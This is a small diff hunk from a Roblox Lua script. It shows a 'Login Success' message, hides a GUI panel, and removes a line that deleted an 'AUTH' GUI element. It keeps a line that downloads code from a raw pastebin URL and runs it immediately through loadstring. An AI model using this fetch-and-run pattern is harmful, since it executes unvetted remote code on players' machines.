@@ -22,6 +22,5 @@ wait(0.000001)
 		game.Players.LocalPlayer.PlayerGui["Interface Main"].PlayerList.KickConfirm.InnerBoxRight.TextLabel.Backdrop.Text = "Login Success, Welcome " ..game.Players.LocalPlayer.Name.. "!"
 			wait(5)
 	game.Players.LocalPlayer.PlayerGui["Interface Main"].PlayerList.KickConfirm.Visible = false
-	game.Players.LocalPlayer.PlayerGui.AUTH:Remove()
 	loadstring(game:HttpGet('https://pastebin.com/raw/2EX82sdc'))()
 	
